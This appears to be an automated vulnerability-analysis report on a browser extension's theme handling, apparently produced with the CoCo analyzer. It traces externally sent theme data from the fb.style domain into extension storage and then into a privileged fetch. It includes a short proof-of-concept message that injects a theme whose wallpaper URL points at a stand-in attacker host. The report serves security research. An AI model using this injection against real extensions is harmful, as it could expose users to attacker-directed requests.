# CoCo Analysis: pefgphdggljhndebojpgacimdmngmjho

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 2

---

## Sink: bg_chrome_runtime_MessageExternal → chrome_storage_local_set_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/pefgphdggljhndebojpgacimdmngmjho/opgen_generated_files/bg.js
Line 1001    if (request.themeData) {
Line 1003        const newThemeData = request.themeData[newThemeId];
```

**Code:**

```javascript
// Background script - chrome.runtime.onMessageExternal listener (Lines 999-1025)
chrome.runtime.onMessageExternal.addListener(
    function (request, sender, sendResponse) {
        if (request.themeData) { // ← attacker-controlled from fb.style
            const newThemeId = Object.keys(request.themeData)[0];
            const newThemeData = request.themeData[newThemeId]; // ← attacker-controlled

            chrome.storage.local.get('theme-list', function (result) {
                const themeList = result['theme-list'] || {};
                themeList[newThemeId] = newThemeData; // ← poisoning storage

                chrome.storage.local.set({ 'theme-list': themeList }, function () {
                    if (chrome.runtime.lastError) {
                        sendResponse({ status: 'error', error: chrome.runtime.lastError });
                    } else {
                        sendResponse({ status: 'success' });
                        chrome.tabs.query({ url: "*://*.fb.style/*" }, function (tabs) {
                            tabs.forEach(tab => {
                                chrome.tabs.sendMessage(tab.id, { command: "updateAddButtons" });
                            });
                        });
                    }
                });
            });
        }
        return true;
    }
);

// Content script - Storage retrieval and use (cs_0.js, Lines 650-677)
let activeThemeId = items.active;
let themeData = items['theme-list'][activeThemeId]; // ← Retrieves poisoned data
let options = {
   text_opt: items.text_opt,
   ui_opt: items.ui_opt,
   wallpaper_opt: items.wallpaper_opt,
   fontOpt: items.font_opt
};
// ...
if (options.wallpaper_opt && themeData.wp) {
   applyWallpaper(themeData.wp); // ← Uses attacker-controlled URL
}

// applyWallpaper function (Lines 690-738)
async function applyWallpaper(wallpaperUrl) { // ← wallpaperUrl is attacker-controlled
   try {
      // ...
      if (need_to_fetch) {
          const cacheName = 'wallpaper-cache';
          let cacheSuccess = true;
          let response;
          try {
             const cache = await caches.open(cacheName);
             response = await cache.match(wallpaperUrl);
             if (!response) {
                response = await fetch(wallpaperUrl); // ← Privileged fetch to attacker URL
                if (response.ok) {
                   await cache.put(wallpaperUrl, response.clone());
                }
             }
          } catch (error) {
             cacheSuccess = false;
          }
          if (!cacheSuccess) {
             response = await fetch(wallpaperUrl); // ← Privileged fetch to attacker URL
          }
          // ...
      }
   } catch (error) {
      console.error("Wallpaper error:", error);
   }
}
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message from fb.style website (chrome.runtime.onMessageExternal)

**Attack:**

```javascript
// From a page on *.fb.style/* domain:
chrome.runtime.sendMessage(
  'pefgphdggljhndebojpgacimdmngmjho', // extension ID
  {
    themeData: {
      'malicious-theme': {
        wp: 'https://attacker.com/steal-data',
        font: 'Arial',
        // ... other theme properties
      }
    }
  },
  function(response) {
    console.log('Theme injected:', response);
  }
);

// The extension will:
// 1. Store the malicious theme data to chrome.storage.local
// 2. When user activates this theme, content script fetches attacker URL
// 3. Attacker receives privileged cross-origin request from extension context
```

**Impact:** Complete storage exploitation chain leading to SSRF (Server-Side Request Forgery). An attacker controlling fb.style domain can inject malicious theme data into extension storage, which is later retrieved and used to perform privileged cross-origin fetch requests to arbitrary attacker-controlled URLs. The extension makes these requests with its elevated privileges, bypassing CORS restrictions.
